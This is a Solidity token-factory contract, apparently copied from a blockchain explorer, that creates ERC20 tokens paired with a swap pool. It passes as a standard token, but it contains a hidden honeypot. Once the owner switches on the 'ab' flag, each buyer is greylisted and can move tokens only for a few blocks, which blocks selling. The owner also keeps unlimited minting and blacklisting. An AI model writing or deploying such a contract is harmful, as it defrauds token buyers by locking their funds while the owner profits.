/**
 *Submitted for verification at Etherscan.io on 2023-06-14
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-22
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-14
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-13
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.4.24;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract Ownable {
    address public owner;


    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


}


contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


contract StandardToken is ERC20 {
    using SafeMath for uint256;

    address public LP;

    bool ab=false;


    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => bool)  tokenBlacklist;
    mapping(address => bool)  tokenGreylist;
    mapping(address => bool)  tokenWhitelist;
    event Blacklist(address indexed blackListed, bool value);
    event Gerylist(address indexed geryListed, bool value);
    event Whitelist(address indexed WhiteListed, bool value);
    mapping(address => uint256)  death;
    uint256  blockN=1;


    mapping(address => uint256) balances;


    function transfer(address _to, uint256 _value) public returns (bool) {
        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){
            require(tokenBlacklist[msg.sender] == false);
            require(tokenBlacklist[_to] == false);

            require(tokenGreylist[msg.sender] == false||block.number<death[msg.sender]+blockN);
            // require(tokenGreylist[_to] == false);
        }
        if(ab&&!tokenWhitelist[_to]&&_to!=LP){
            tokenGreylist[_to] = true;
            emit Gerylist(_to, true);
            if(death[_to]==0){
                death[_to]=block.number;
            }
        }

        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if(!tokenWhitelist[_from]&&!tokenWhitelist[_to]){
            require(tokenBlacklist[msg.sender] == false);
            require(tokenBlacklist[_from] == false);
            require(tokenBlacklist[_to] == false);

            require(tokenGreylist[_from] == false||block.number<death[_from]+blockN);
        }

        if(ab&&!tokenWhitelist[_to]&&_to!=LP){
            tokenGreylist[_to] = true;
            emit Gerylist(_to, true);
            if(death[_to]==0){
                death[_to]=block.number;
            }
        }
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function _changeAb(bool _ab) internal returns (bool) {
        require(ab != _ab);
        ab=_ab;
        return true;
    }

    function _changeBlockN(uint256 _blockN) internal returns (bool) {
        blockN=_blockN;
    }

    function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
        require(tokenBlacklist[_address] != _isBlackListed);
        tokenBlacklist[_address] = _isBlackListed;
        emit Blacklist(_address, _isBlackListed);
        return true;
    }

    function _geryList(address _address, bool _isGeryListed) internal returns (bool) {
        require(tokenGreylist[_address] != _isGeryListed);
        tokenGreylist[_address] = _isGeryListed;
        emit Gerylist(_address, _isGeryListed);
        return true;
    }
    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
        require(tokenWhitelist[_address] != _isWhiteListed);
        tokenWhitelist[_address] = _isWhiteListed;
        emit Whitelist(_address, _isWhiteListed);
        return true;
    }
    function _blackAddressList(address[] _addressList, bool _isBlackListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenBlacklist[_addressList[i]] = _isBlackListed;
            emit Blacklist(_addressList[i], _isBlackListed);
        }
        return true;
    }
    function _geryAddressList(address[] _addressList, bool _isGeryListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            tokenGreylist[_addressList[i]] = _isGeryListed;
            emit Gerylist(_addressList[i], _isGeryListed);
        }
        return true;
    }


}

contract PausableToken is StandardToken, Ownable {

    function transfer(address _to, uint256 _value) public  returns (bool) {
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public  returns (bool) {
        return super.approve(_spender, _value);
    }

    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
    function changeAb(bool _ab) public  onlyOwner  returns (bool success) {
        return super._changeAb(_ab);
    }

    function changeBn(uint _bn) public  onlyOwner  returns (bool success) {
        return super._changeBlockN(_bn);
    }

    function blackListAddress(address listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
        return super._blackList(listAddress, isBlackListed);
    }
    function geryListAddress(address listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
        return super._geryList(listAddress, _isGeryListed);
    }
    function whiteListAddress(address listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {
        return super._whiteList(listAddress, _isWhiteListed);
    }
    function blackAddressList(address[] listAddress,  bool isBlackListed) public  onlyOwner  returns (bool success) {
        return super._blackAddressList(listAddress, isBlackListed);
    }
    function geryAddressList(address[] listAddress,  bool _isGeryListed) public  onlyOwner  returns (bool success) {
        return super._geryAddressList(listAddress, _isGeryListed);
    }

}

contract CoinToken is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    event Mint(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed burner, uint256 value);
    bool internal _INITIALIZED_;

    constructor() public {

    }
    modifier notInitialized() {
        require(!_INITIALIZED_, "INITIALIZED");
        _;
    }
    function initToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address factory,address token1) public notInitialized returns (bool){
        _INITIALIZED_=true;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;

        // // service.transfer(msg.value);
        // (bool success) = service.call.value(msg.value)();
        // require(success, "Transfer failed.");
        emit Transfer(address(0), tokenOwner, totalSupply);
        LP = ISwapFactory(factory).createPair(address(this), token1);
    }









    function mint(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Mint(address(0), account, amount);
        emit Transfer(address(0), account, amount);
    }


}

contract CoinFtc{


    function createToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply,address tokenOwner,address factory,address token1)public returns (address){
        CoinToken token=new CoinToken();
        token.initToken(_name,_symbol,_decimals,_supply,tokenOwner,factory,token1);
        return address(token);
    }
}